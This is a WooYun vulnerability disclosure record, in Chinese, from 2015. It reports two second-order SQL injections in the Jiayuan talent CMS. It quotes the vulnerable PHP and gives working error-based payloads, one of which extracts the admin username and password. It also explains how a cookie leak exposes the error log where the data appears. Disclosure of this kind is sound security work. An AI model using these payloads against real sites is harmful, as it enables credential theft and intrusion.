{"id": 36811, "wybug_id": "wooyun-2015-0101044", "wybug_title": "嘉缘人才系统两处sql注入打包（直接出数据）", "wybug_corp": "finereason.com", "wybug_author": "牛肉包子", "wybug_date": "2015-03-13 11:33", "wybug_open_date": "2015-06-16 11:35", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-18：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-16：\t细节向公众公开  简要描述： 最新版20150126 详细说明：  看到\\frcms\\member\\company_myexpert.php\nelseif($do=='myexpert'){\tif($Glimit[1]<0){showmsg('您所在的会员组您无权使用人才库！',\"-1\",0,2000);exit();}    require_once(FR_ROOT.'/inc/paylog.inc.php');\t$checksnum=count(explode(',',$checks));\t//var_dump($uinfo['m_name']);\t//exit;\tif($Glimit[1]&&$uinfo['limit'][11]<$checksnum){showmsg('您的人才库可用数量不足，请返回重新选择！',\"-1\",0,2000);exit();}\tif($checks!=''){\t\t$sql=\"select r_id,r_name,r_sex,r_birth,r_edu,r_member from {$cfg['tb_pre']}resume where r_id in ($checks) order by r_adddate desc limit 0,$checksnum\";\t\t$query=$db->query($sql);\t\t$i=0;\t\twhile($row=$db->fetch_array($query)){        \t$rsd = $db->get_one(\"select * from {$cfg['tb_pre']}myexpert where m_pmember='$row[r_member]' and m_cmember='$username' and m_rid=$row[r_id] limit 0,1\");\t\t\tif(!$rsd){\t\t\t\t$db ->query(\"INSERT INTO {$cfg['tb_pre']}myexpert (m_rid,m_name,m_sex,m_birth,m_edu,m_cmember,m_pmember,m_adddate,m_exp) VALUES('$row[r_id]','$row[r_name]','$row[r_sex]','$row[r_birth]','$row[r_edu]','$username','$row[r_member]',NOW(),1)\"); //注入一\t\t\t\t$i++;\t                //添加会员交互记录                adddynamic($Memberid,$uinfo['m_name'],2,8,$row['r_id'],$row['r_name'],5);//注入二\n跟进adddynamic\nfunction adddynamic($mid,$name,$typeid,$operation,$bid,$bname,$type){    global $cfg,$db;\t$db->query(\"INSERT INTO {$cfg['tb_pre']}dynamic(`d_mid`,`d_name`,`d_typeid`,`d_operation`,`d_bid`,`d_bname`,`d_type`,`d_time`) VALUES('$mid','$name','$typeid','$operation','$bid','$bname','$type',NOW())\");\n第一处首先注册一个用户，然后新建一份简历，抓包把简历名修改为\n' or updatexml(1,concat(0x7e,(version())),0) or'\n\n\n并且记录rid的值，这里我们的rid值为7。然后注册一个企业用户。访问\nhttp://127.0.0.1/frcms/member/index.php?m=company_myexpert&do=myexpert&checks=7\n可以发现mysql报错了。\n\n发现mysql报错了，这cms会把错误记录到一个文件里面。如下代码实现\nfunction log_write($message, $type = 'php') {\tglobal $cfg, $fr_time, $username;\t$userip = getip();    $fr_time or $fr_time = time();\t$user = $username ? $username : 'guest';    dir_create(DATA_ROOT.'/log/');    $log_file = DATA_ROOT.'/log/'.$type.'_'.md5($cfg['cookie_encode']).'.txt';\t$log = date('Y-m-d H:i:s', $fr_time).\"||$userip||$user||\".$_SERVER['SCRIPT_NAME'].\"||\".str_replace('&', '&amp;', $_SERVER['QUERY_STRING']).\"||$message\\r\\n\";    $olog=file_get_contents($log_file);    fputs(fopen($log_file,\"w\"), $log.$olog);}\n主要是要获取到$cfg['cookie_encode']这个值，然后就可以找到这个文件了。我们可以看到在最新版cookie是这样设置的。\nfunction _setcookie($var, $value = '', $time = 0) {    global $cfg, $fr_time;\t$time = $time > 0 ? $fr_time+$time : (empty($value) ? $fr_time - 3600 : 0);\t$port = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;\t$var = $cfg['cookie_pre'].$var;$value&&$value=base64_encode($value.$cfg['cookie_encode']);\treturn setcookie($var, $value, $time, $cfg['cookie_path'], $cfg['cookie_domain'], $port);}\n可以看到这儿就泄露了。然后可以得到$cfg['cookie_encode'])为SgZQd3305V，日志文件路径为\nhttp://127.0.0.1/frcms/data/log/sql_e15a0a25dbd4030a31357433e2a1b26a.txt\n\n\n第二处首先注册一个企业用户，抓包把公司名修改为\n'or char(@`'`) or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(a_user,0x27,a_pass)) FROM job_admin limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) ,0)# or\n\n\n然后任意访问一份简历，可以发现报错\n\n用同样的方法找到文件，可以看到数据已经出现了。\n\n   漏洞证明：  \n\n\n\n   修复方案：  出库后转义   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-16 11:35 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}